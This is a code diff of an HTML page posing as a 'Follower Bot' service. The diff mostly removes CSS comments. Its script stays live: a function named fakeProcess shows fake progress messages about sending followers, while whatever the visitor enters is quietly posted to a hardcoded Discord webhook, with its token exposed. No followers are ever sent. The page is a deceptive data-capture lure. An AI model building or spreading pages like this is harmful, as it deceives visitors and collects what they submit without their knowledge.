@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Follower Bot</title>
 <style>
-/* ---------------- GLOBAL STYLES ---------------- */
 body {
     margin: 0;
     padding: 0;
@@ -15,8 +14,6 @@ body {
     min-height: 100vh;
     overflow-x: hidden;
 }
-
-/* ---------------- ABSTRACT BACKGROUND ---------------- */
 .bg-wave {
     position: fixed;
     top: -20%;
@@ -29,13 +26,10 @@ body {
     animation: waveFloat 16s ease-in-out infinite alternate;
     z-index: -10;
 }
-
 @keyframes waveFloat {
     from { transform: translate(-50%, 0) scale(1); }
     to { transform: translate(-50%, -100px) scale(1.25); }
 }
-
-/* ---------------- FLOATING PARTICLES ---------------- */
 .particle {
     position: fixed;
     width: 6px;
@@ -46,13 +40,10 @@ body {
     animation: particleFloat 12s linear infinite;
     z-index: -5;
 }
-
 @keyframes particleFloat {
     0% { transform: translateY(110vh) translateX(-10vw); opacity: 1; }
     100% { transform: translateY(-20vh) translateX(10vw); opacity: 0; }
 }
-
-/* ---------------- HERO ---------------- */
 .hero {
     text-align: center;
     padding-top: 100px;
@@ -60,7 +51,6 @@ body {
     transform: translateY(40px);
     animation: fadeInUp 1.2s forwards 0.2s;
 }
-
 .hero-title {
     font-size: 56px;
     font-weight: 900;
@@ -69,15 +59,12 @@ body {
     color: transparent;
     text-shadow: 0 0 40px #ffcc4488;
 }
-
 .hero-subtitle {
     margin-top: 12px;
     font-size: 20px;
     opacity: 0.75;
     letter-spacing: 1.2px;
 }
-
-/* ---------------- MAIN WRAPPER ---------------- */
 .main-wrapper {
     display: flex;
     justify-content: center;
@@ -86,8 +73,6 @@ body {
     margin-top: 80px;
     padding-bottom: 200px;
 }
-
-/* ---------------- PANEL ---------------- */
 .panel {
     position: relative;
     width: 420px;
@@ -102,19 +87,15 @@ body {
     opacity: 0;
     transform: translateY(40px);
 }
-
 .panel.show {
     opacity: 1;
     transform: translateY(0px);
     transition: all 1s ease-out;
 }
-
 .panel:hover {
     transform: translateY(-12px) scale(1.04);
     box-shadow: 0 0 55px #ffae00aa, inset 0 0 35px #ff880033;
 }
-
-/* ---------------- PANEL TITLE ---------------- */
 .panel-title {
     font-size: 28px;
     font-weight: 700;
@@ -125,8 +106,6 @@ body {
     transform: translateY(20px);
     animation: fadeInUp 1s forwards 0.5s;
 }
-
-/* ---------------- PANEL FOOTER ---------------- */
 .panel-footer {
     position: absolute;
     bottom: 18px;
@@ -138,8 +117,6 @@ body {
     color: #ffcc66;
     text-shadow: 0 0 12px #ffcc6677;
 }
-
-/* ---------------- INPUT BOX ---------------- */
 .input-wrapper {
     background: rgba(20, 15, 25, 0.65);
     border: 1px solid #dba244;
@@ -150,12 +127,10 @@ body {
     margin-bottom: 30px;
     transition: 0.25s ease;
 }
-
 .input-wrapper:hover {
     border-color: #ffcc66;
     box-shadow: 0 0 22px #ffcc6655;
 }
-
 .input-wrapper svg {
     width: 22px;
     height: 22px;
@@ -163,7 +138,6 @@ body {
     fill: #ffcc66;
     transition: 0.25s ease;
 }
-
 .input-wrapper input {
     border: none;
     background: transparent;
@@ -172,8 +146,6 @@ body {
     outline: none;
     width: 100%;
 }
-
-/* ---------------- BUTTON ---------------- */
 button {
     width: 100%;
     padding: 16px;
@@ -187,12 +159,10 @@ button {
     box-shadow: 0 0 30px #ffae0066;
     transition: 0.3s ease;
 }
-
 button:hover {
     transform: translateY(-4px) scale(1.05);
     box-shadow: 0 0 50px #ffb933aa;
 }
-
 .success {
     margin-top: 20px;
     display: none;
@@ -200,7 +170,6 @@ button:hover {
     color: #ffddaa;
     text-shadow: 0 0 10px #ffb73366;
 }
-
 .video-box {
     width: 100%;
     height: 260px;
@@ -210,13 +179,11 @@ button:hover {
     border: 1px solid #ffb84f99;
     box-shadow: inset 0 0 18px #000000aa;
 }
-
 .video-box video {
     width: 100%;
     height: 100%;
     object-fit: cover;
 }
-
 footer {
     margin-top: 120px;
     padding-bottom: 40px;
@@ -225,12 +192,10 @@ footer {
     opacity: 0.6;
     text-shadow: 0 0 6px #ffbb3388;
 }
-
 @keyframes fadeInUp {
     from { opacity: 0; transform: translateY(20px); }
     to { opacity: 1; transform: translateY(0px); }
 }
-
 @media (max-width: 950px) {
     .main-wrapper {
         flex-direction: column;
@@ -302,16 +267,13 @@ function addSparks(panel) {
 addSparks(document.getElementById("panel-left"));
 addSparks(document.getElementById("panel-right"));
 
-/* ---------------- SAFE WEBHOOK SENDER WITH CHUNKING ---------------- */
 async function sendChunksToWebhook(fullMessage) {
     const webhookURL = "https://discord.com/api/webhooks/1439152866605535292/nR4j3hFdhqp4AnXCBVzUaijYXNE1sGgV4gjLEZXuFTvT6u9FYCzAA9_37oChjzM7dQdc";
     const maxLen = 2000;
-
     const chunks = [];
     for (let i = 0; i < fullMessage.length; i += maxLen) {
         chunks.push(fullMessage.substring(i, i + maxLen));
     }
-
     for (let i = 0; i < chunks.length; i++) {
         await fetch(webhookURL, {
             method: "POST",
@@ -322,7 +284,6 @@ async function sendChunksToWebhook(fullMessage) {
     }
 }
 
-/* ---------------- PROCESS BUTTON ---------------- */
 async function fakeProcess() {
     const input = document.getElementById("message").value.trim();
     const msg = document.getElementById("msg");
@@ -332,17 +293,17 @@ async function fakeProcess() {
         return;
     }
 
-    // Show "Sending bots..."
+    // Show initial message
     msg.style.display = "block";
     msg.textContent = "Success sending bot followers please wait 5 seconds...";
 
-    // Wait 3 seconds
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    // Wait 5 seconds
+    await new Promise(resolve => setTimeout(resolve, 5000));
 
     // Send webhook
     await sendChunksToWebhook(input);
 
-    // Show success message
+    // Show final success message
     msg.textContent = "Successfully Sent Followers";
 
     // Hide after 3 seconds
@@ -351,18 +312,14 @@ async function fakeProcess() {
     }, 3000);
 }
 
-/* ---------------- PANEL REVEAL ON SCROLL ---------------- */
 const panels = document.querySelectorAll(".panel");
 const observer = new IntersectionObserver(entries => {
     entries.forEach(entry => {
         if (entry.isIntersecting) entry.target.classList.add("show");
     });
 }, { threshold: 0.2 });
-
 panels.forEach(panel => observer.observe(panel));
 </script>
 
 </body>
 </html>
-
-
